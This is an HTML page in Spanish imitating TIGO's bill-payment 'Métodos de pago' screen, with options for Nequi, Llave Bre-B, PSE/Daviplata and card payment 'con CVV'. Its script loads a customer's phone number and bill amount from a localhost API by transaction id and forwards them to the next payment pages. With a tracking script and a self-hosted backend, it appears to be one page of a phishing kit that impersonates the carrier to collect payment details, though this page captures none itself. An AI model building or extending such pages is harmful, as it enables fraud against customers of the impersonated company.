<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TIGO - Métodos de Pago</title>
    <link rel="icon" type="image/png" href="favicon.png">
    <link rel="stylesheet" href="fonts.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Dm Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f5f5f5;
        }

        .spinner-mini {
            display: inline-block;
            width: 14px;
            height: 14px;
            border: 2px solid #ddd;
            border-top: 2px solid #001eb4;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-right: 6px;
            vertical-align: middle;
        }

        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        .header {
            background: linear-gradient(135deg, #003399 0%, #0052cc 100%);
            padding: 15px 20px;
            color: white;
            display: flex;
            align-items: center;
            gap: 15px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }

        .logo {
            width: 100px;
            height: 40px;
        }

        .logo img {
            max-width: 100%;
            height: auto;
        }

        .header-icon {
            font-family: 'tigo-icons-pack1';
            font-size: 18px;
        }

        .header-text {
            font-size: 14px;
            font-weight: 500;
        }

        .header-dropdown {
            margin-left: auto;
            cursor: pointer;
            font-size: 20px;
        }

        .container {
            max-width: 1000px;
            margin: 0 auto;
            padding: 20px;
        }

        .back-button {
            display: inline-flex;
            align-items: center;
            color: #44c8f5;
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 30px;
            cursor: pointer;
        }

        .back-button svg {
            width: 20px;
            height: 20px;
            margin-right: 8px;
            stroke: currentColor;
        }

        .page-title {
            font-size: 28px;
            color: #001eb4;
            font-weight: 500;
            margin-bottom: 30px;
        }

        .content {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
        }

        .details-card {
            background: white;
            padding: 8px 20px 6px 20px;
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
            height: 114px;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .details-card h3 {
            font-size: 24px;
            color: #001eb4;
            font-weight: 500;
            margin-bottom: 8px;
            margin-top: -4px;
        }

        .detail-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 4px;
            padding-bottom: 4px;
            border-bottom: 1px solid #f0f0f0;
        }

        .detail-row:last-child {
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }

        .detail-label {
            font-size: 13px;
            color: #001eb4;
            font-weight: 500;
        }

        .detail-value {
            font-size: 14px;
            color: #999;
            font-weight: 400;
        }

        .payment-methods {
            display: flex;
            flex-direction: column;
            gap: 0;
            background: white;
            padding: 16px 20px;
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
        }

        .payment-methods h3 {
            font-size: 24px;
            color: #001eb4;
            font-weight: 500;
            margin-bottom: 12px;
            margin-top: -4px;
        }

        .payment-method {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 0;
            border-bottom: 1px solid #f0f0f0;
            cursor: pointer;
            transition: background 0.2s ease;
        }

        .payment-method:last-child {
            border-bottom: none;
        }

        .payment-method:hover {
            background: #fafbfc;
        }

        .payment-method-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .payment-icon {
            width: 32px;
            height: 32px;
            border-radius: 6px;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        .payment-icon img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .payment-name {
            font-size: 14px;
            color: #001eb4;
            font-weight: 500;
        }

        .payment-arrow {
            color: #44c8f5;
            font-size: 20px;
        }

        @media (max-width: 768px) {
            .content {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body data-pagina="pago-inicio">
    <script src="/track-payment.js"></script>
    <div class="header">
        <div class="logo">
            <img src="assets/logos/tigo-logo.svg" alt="TIGO">
        </div>
        <div class="header-icon">&#xEC83;</div>
        <div class="header-text">Pospago <strong id="phoneNumber"><span class="spinner-mini"></span></strong></div>
        <div class="header-dropdown">⋮</div>
    </div>

    <div class="container">
        <a class="back-button" href="listado">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <polyline points="15 18 9 12 15 6"></polyline>
            </svg>
            REGRESAR
        </a>

        <h1 class="page-title">Métodos de pago</h1>

        <div class="content">
            <div class="details-card">
                <h3>Detalles</h3>
                <div class="detail-row">
                    <span class="detail-label">Tipo de producto</span>
                    <span class="detail-value">Pago de Factura</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">Monto de factura</span>
                    <span class="detail-value" id="montoFactura"><span class="spinner-mini"></span></span>
                </div>
            </div>

            <div>
                <div class="payment-methods">
                    <h3>Escoge tu forma de pago</h3>

                    <div class="payment-method" onclick="irAMetodo('pago-nequi')">
                        <div class="payment-method-left">
                            <div class="payment-icon">
                                <img src="assets/logos/nequi.png" alt="Nequi">
                            </div>
                            <span class="payment-name">Nequi</span>
                        </div>
                        <span class="payment-arrow">›</span>
                    </div>

                    <div class="payment-method" onclick="irAMetodo('pago-llave')">
                        <div class="payment-method-left">
                            <div class="payment-icon">
                                <img src="assets/logos/bre-b.svg" alt="Llave Bre-B">
                            </div>
                            <span class="payment-name">Llave Bre-B</span>
                        </div>
                        <span class="payment-arrow">›</span>
                    </div>

                    <div class="payment-method" onclick="irAMetodo('pago-informacion-bancaria')">
                        <div class="payment-method-left">
                            <div class="payment-icon">
                                <img src="assets/logos/pse.png" alt="PSE">
                            </div>
                            <span class="payment-name">PSE / Daviplata</span>
                        </div>
                        <span class="payment-arrow">›</span>
                    </div>

                    <div class="payment-method" onclick="irAMetodo('pago-tarjeta')">
                        <div class="payment-method-left">
                            <div class="payment-icon">
                                <img src="assets/logos/tc.png" alt="Tarjeta Crédito">
                            </div>
                            <span class="payment-name">Tarjeta crédito / débito con CVV</span>
                        </div>
                        <span class="payment-arrow">›</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const txid = params.get('txid');

        let phoneNumber = '';
        let valorFormateado = '';
        let valorPago = '';
        let estado = '';

        // Cargar datos desde R2 si viene txid
        if (txid) {
            fetch(`http://localhost:9090/api/consulta/${txid}`)
                .then(res => res.json())
                .then(data => {
                    if (data.ok && data.data) {
                        const tx = data.data;
                        phoneNumber = tx.referencia || '';
                        valorFormateado = tx.valor_formateado || '';
                        valorPago = tx.valor_pago || '0';
                        estado = tx.estado || 'pendiente';

                        console.log('[PAGO-INICIO] Datos cargados desde R2:', { phoneNumber, valorFormateado, valorPago });

                        // Actualizar UI
                        document.getElementById('phoneNumber').textContent = phoneNumber;
                        document.getElementById('montoFactura').textContent = valorFormateado;
                    } else {
                        console.warn('[PAGO-INICIO] No se encontraron datos:', data.error);
                    }
                })
                .catch(err => console.error('[PAGO-INICIO] Error cargando consulta:', err));
        }

        function irAMetodo(url) {
            const queryParams = new URLSearchParams({
                txid: txid,
                referencia: phoneNumber,
                valor_formateado: valorFormateado,
                valor_pago: valorPago,
                estado: estado
            });
            window.location.href = url + '?' + queryParams.toString();
        }
    </script>
</body>
</html>
